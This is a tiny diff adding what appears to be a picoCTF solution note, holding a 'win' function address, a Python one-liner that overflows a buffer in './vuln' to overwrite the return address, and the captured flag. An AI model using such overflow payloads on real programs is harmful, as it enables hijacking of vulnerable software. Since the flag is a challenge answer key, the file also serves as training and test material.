@@ -1,0 +1,5 @@
+win: 080485CB
+
+python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xCB\x85\x04\x08FFFF'" | ./vuln
+
+picoCTF{addr3ss3s_ar3_3asyd69e032d}
